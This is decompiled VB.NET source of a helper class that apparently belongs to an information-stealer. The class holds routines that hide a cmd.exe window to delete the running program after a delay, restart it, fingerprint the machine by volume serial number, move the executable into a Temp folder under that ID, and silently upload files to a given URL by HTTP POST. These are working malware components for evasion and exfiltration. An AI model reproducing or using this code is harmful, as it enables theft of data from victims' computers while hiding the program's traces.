Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Reflection

Namespace Main.Tools
	' Token: 0x0200001B RID: 27
	Friend Class Helper
		' Token: 0x060000A3 RID: 163 RVA: 0x000078D0 File Offset: 0x00005AD0
		Public Shared Function GetRandomString() As String
			Return Path.GetRandomFileName().Replace(".", "")
		End Function

		' Token: 0x060000A4 RID: 164 RVA: 0x000025C4 File Offset: 0x000007C4
		Public Shared Sub SelfDelete(dir As String, name As String)
			Process.Start(New ProcessStartInfo() With { .Arguments = "/C choice /C Y /N /D Y /T 1 & Del """ + name + """", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe" })
		End Sub

		' Token: 0x060000A5 RID: 165 RVA: 0x00002600 File Offset: 0x00000800
		Public Shared Sub SelfRestart(name As String)
			Process.Start(New ProcessStartInfo() With { .Arguments = "/C choice /C Y /N /D Y /T 1 & """ + name + " --zip""", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe" })
		End Sub

		' Token: 0x060000A6 RID: 166 RVA: 0x000078F4 File Offset: 0x00005AF4
		Public Shared Function GetHwid() As String
			Dim text As String = ""
			Try
				Dim text2 As String = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1)
				Dim managementObject As ManagementObject = New ManagementObject("win32_logicaldisk.deviceid=""" + text2 + ":""")
				managementObject.[Get]()
				Dim text3 As String = managementObject("VolumeSerialNumber").ToString()
				text = text3
			Catch ex As Exception
			End Try
			Return text
		End Function

		' Token: 0x060000A7 RID: 167 RVA: 0x00007960 File Offset: 0x00005B60
		Public Shared Function Move() As String
			Try
				Dim text As String = Environment.GetEnvironmentVariable("Temp") + "\" + Helper.GetHwid()
				Directory.CreateDirectory(text)
				File.Move(Directory.GetCurrentDirectory() + "\" + New FileInfo(New Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, text + "\temp.exe")
				Return text
			Catch ex As Exception
			End Try
			Return Nothing
		End Function

		' Token: 0x060000A8 RID: 168 RVA: 0x000079E8 File Offset: 0x00005BE8
		Public Shared Sub SendFile(url As String, filepath As String)
			Try
				New WebClient().UploadFile(url, "POST", filepath)
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
